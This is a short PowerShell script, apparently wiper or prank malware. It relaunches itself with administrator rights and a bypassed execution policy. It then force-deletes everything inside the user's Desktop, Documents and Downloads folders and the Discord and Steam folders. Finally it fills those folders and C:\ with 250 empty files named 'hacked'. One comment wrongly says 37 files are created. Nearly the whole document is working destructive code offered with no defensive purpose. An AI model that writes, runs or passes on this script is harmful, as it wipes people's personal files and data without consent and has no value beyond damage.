function admin {
    $IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    Start-Process powershell.exe `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -Verb RunAs
    exit
}
}

function delfiles {
    $TargetPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:LOCALAPPDATA\Discord",
    "$env:LOCALAPPDATA\Steam",
    "$env:APPDATA\discord",
    "C:\Program Files (x86)\Steam"
)

foreach ($TargetPath in $TargetPaths) {
    if (Test-Path $TargetPath) {

        # Delete all contents inside the folder, but not the folder itself
        Get-ChildItem -LiteralPath $TargetPath -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction Stop
                Write-Host "Deleted: $($_.FullName)"
            }
            catch {
                Write-Error "Failed to delete $($_.FullName): $_"
            }
        }

    } else {
        Write-Warning "Not found: $TargetPath"
    }
}
}

function junkfiles {
    # 1. Define the directories where you want the files created
$targetPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "C:\"
)

# 2. Loop through each directory
foreach ($path in $targetPaths) {
    
    # Create the directory if it doesn't already exist
    if (!(Test-Path -Path $path)) {
        New-Item -ItemType Directory -Path $path | Out-Null
        Write-Host "Created directory: $path" -ForegroundColor Cyan
    }

    # 3. Create 37 empty .txt files in the current directory
    for ($i = 1; $i -le 250; $i++) {
        $fileName = "hacked$i.txt"
        $fullPath = Join-Path -ChildPath $fileName -Path $path
        
        # New-Item creates the file; -Force overwrites if it already exists
        New-Item -Path $fullPath -ItemType "file" -Force | Out-Null
    }

    Write-Host "Successfully created files" -ForegroundColor Green
}
}

admin
delfiles
Start-Sleep -Seconds 5
junkfiles
